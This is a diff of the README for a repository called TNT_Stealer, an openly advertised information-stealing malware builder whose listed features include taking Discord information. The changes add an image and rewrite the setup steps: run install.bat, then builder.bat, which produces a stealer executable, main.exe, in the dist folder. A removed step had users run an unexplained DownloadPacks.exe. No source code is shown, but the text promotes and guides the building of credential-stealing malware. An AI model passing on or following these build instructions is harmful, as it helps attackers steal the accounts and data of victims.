@@ -5,6 +5,10 @@ TNT_Stealer
 🌟 Please star the repo 🌟 
 </h2>
 
+
+![standard](https://github.com/TNTaddicted/TNT_Stealer/assets/131607911/97468d76-204b-4ce2-895c-ae78e04e9c98)
+
+
 ## Features
 
 -   Discord information
@@ -54,9 +58,8 @@ TNT_Stealer
 1. Clone This repo
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
-4. Then check that the requiured packages have been installed by double clicking `DownloadPacks.exe` file
-5. Run the builder by double clicking the `builder.bat` file
-6. Follow instructions in builder and your exe will be found in the `dist` folder
+4. Run the builder by double clicking the `builder.bat` file
+5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
 
 
 ## Disclaimer:
